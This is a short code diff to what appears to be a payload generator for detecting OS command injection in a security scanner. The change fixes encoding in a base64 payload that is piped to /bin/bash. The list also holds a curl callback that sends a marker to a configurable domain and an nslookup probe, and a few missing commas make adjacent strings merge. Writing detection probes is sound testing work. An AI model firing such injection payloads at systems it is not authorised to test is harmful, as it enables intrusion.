@@ -30,7 +30,7 @@ class OSCommandInjectionPayloadGenerator(GenerationModule):
             f"echo {self.unique_string}",
             f"echo $(( 1337 * 1337 ))",
             f"yes {self.unique_string} | head -n 3 | tr -d '\n'"
-            f"echo "+ base64.b64encode("yes PAYLOAD | head -n 3 | tr -d '\n'".replace("PAYLOAD", self.unique_string))+" | base64 -d | /bin/bash"
+            f"echo "+ base64.b64encode("yes PAYLOAD | head -n 3 | tr -d '\n'".replace("PAYLOAD", self.unique_string).encode()).decode()+" | base64 -d | /bin/bash"
             f"curl http://{self.domain}/?d={self.unique_string}",
             f"nslookup {self.domain}",
         ]
